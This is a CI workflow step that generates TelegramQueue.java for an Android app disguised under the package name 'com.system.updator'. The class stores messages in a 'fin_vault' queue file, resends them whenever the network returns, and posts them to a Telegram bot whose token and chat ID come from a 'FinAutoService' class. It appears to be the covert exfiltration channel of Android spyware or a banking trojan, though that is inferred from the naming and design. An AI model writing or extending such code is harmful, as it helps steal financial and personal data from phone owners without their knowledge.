      - name: Generate TelegramQueue.java
        run: |
          cat > app/src/main/java/com/system/updator/TelegramQueue.java << 'EOF'
          package com.system.updator;

          import android.content.Context;
          import android.net.ConnectivityManager;
          import android.net.Network;
          import android.net.NetworkCapabilities;
          import android.net.NetworkRequest;
          import android.util.Log;

          import org.json.JSONObject;

          import java.io.BufferedReader;
          import java.io.File;
          import java.io.FileInputStream;
          import java.io.FileOutputStream;
          import java.io.InputStreamReader;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          import java.nio.charset.StandardCharsets;
          import java.util.ArrayList;
          import java.util.List;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;

          public class TelegramQueue {

              private static final String TAG = "TelegramQueue";
              private static final int MAX_QUEUE = 500;

              private static TelegramQueue instance;

              private final Context appContext;
              private final File queueFile;
              private final ExecutorService executor = Executors.newSingleThreadExecutor();
              private final Object lock = new Object();

              private ConnectivityManager.NetworkCallback networkCallback;

              private TelegramQueue(Context context) {
                  this.appContext = context.getApplicationContext();
                  File dir = new File(appContext.getFilesDir(), "fin_vault");
                  if (!dir.exists()) dir.mkdirs();
                  this.queueFile = new File(dir, "telegram_queue.jsonl");
              }

              public static synchronized TelegramQueue get(Context context) {
                  if (instance == null) instance = new TelegramQueue(context);
                  return instance;
              }

              public void registerNetworkCallback() {
                  if (networkCallback != null) return;
                  try {
                      ConnectivityManager cm = (ConnectivityManager)
                              appContext.getSystemService(Context.CONNECTIVITY_SERVICE);
                      if (cm == null) return;
                      networkCallback = new ConnectivityManager.NetworkCallback() {
                          @Override
                          public void onAvailable(Network network) {
                              flush();
                          }
                      };
                      NetworkRequest req = new NetworkRequest.Builder()
                              .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                              .build();
                      cm.registerNetworkCallback(req, networkCallback);
                  } catch (Exception e) {
                      Log.e(TAG, "registerNetworkCallback failed", e);
                  }
              }

              public void send(String text) {
                  if (text == null || text.isEmpty()) return;
                  enqueue(text);
                  flush();
              }

              private void enqueue(String text) {
                  synchronized (lock) {
                      try {
                          JSONObject obj = new JSONObject();
                          obj.put("ts", System.currentTimeMillis());
                          obj.put("text", text);
                          List<String> lines = readQueue();
                          lines.add(obj.toString());
                          if (lines.size() > MAX_QUEUE) {
                              int drop = lines.size() - MAX_QUEUE;
                              for (int i = 0; i < drop; i++) lines.remove(0);
                          }
                          writeQueue(lines);
                      } catch (Exception e) {
                          Log.e(TAG, "enqueue failed", e);
                      }
                  }
              }

              public void flush() {
                  executor.execute(this::flushInternal);
              }

              private void flushInternal() {
                  synchronized (lock) {
                      List<String> lines = readQueue();
                      if (lines.isEmpty()) return;
                      List<String> remaining = new ArrayList<>();
                      boolean stop = false;
                      for (int i = 0; i < lines.size(); i++) {
                          String line = lines.get(i);
                          if (stop) { remaining.add(line); continue; }
                          String text;
                          try {
                              JSONObject obj = new JSONObject(line);
                              text = obj.optString("text", "");
                          } catch (Exception e) { continue; }
                          if (text.isEmpty()) continue;
                          boolean ok = sendSync(text);
                          if (ok) {
                              try { Thread.sleep(300); } catch (InterruptedException ignored) { }
                          } else {
                              remaining.add(line);
                              stop = true;
                          }
                      }
                      writeQueue(remaining);
                  }
              }

              private boolean sendSync(String text) {
                  HttpURLConnection conn = null;
                  try {
                      String encoded = URLEncoder.encode(text, "UTF-8");
                      String urlStr = "https://api.telegram.org/bot"
                              + FinAutoService.BOT_TOKEN + "/sendMessage?chat_id="
                              + FinAutoService.CHAT_ID
                              + "&parse_mode=Markdown&text=" + encoded;
                      URL url = new URL(urlStr);
                      conn = (HttpURLConnection) url.openConnection();
                      conn.setRequestMethod("GET");
                      conn.setConnectTimeout(8000);
                      conn.setReadTimeout(8000);
                      int code = conn.getResponseCode();
                      return code >= 200 && code < 300;
                  } catch (Exception e) {
                      return false;
                  } finally {
                      if (conn != null) conn.disconnect();
                  }
              }

              private List<String> readQueue() {
                  List<String> out = new ArrayList<>();
                  if (!queueFile.exists()) return out;
                  try (BufferedReader br = new BufferedReader(
                          new InputStreamReader(new FileInputStream(queueFile),
                                  StandardCharsets.UTF_8))) {
                      String line;
                      while ((line = br.readLine()) != null) {
                          if (!line.trim().isEmpty()) out.add(line);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "readQueue failed", e);
                  }
                  return out;
              }

              private void writeQueue(List<String> lines) {
                  try (FileOutputStream fos = new FileOutputStream(queueFile, false)) {
                      for (String l : lines) {
                          fos.write(l.getBytes(StandardCharsets.UTF_8));
                          fos.write('\n');
                      }
                      fos.flush();
                  } catch (Exception e) {
                      Log.e(TAG, "writeQueue failed", e);
                  }
              }
          }
          EOF

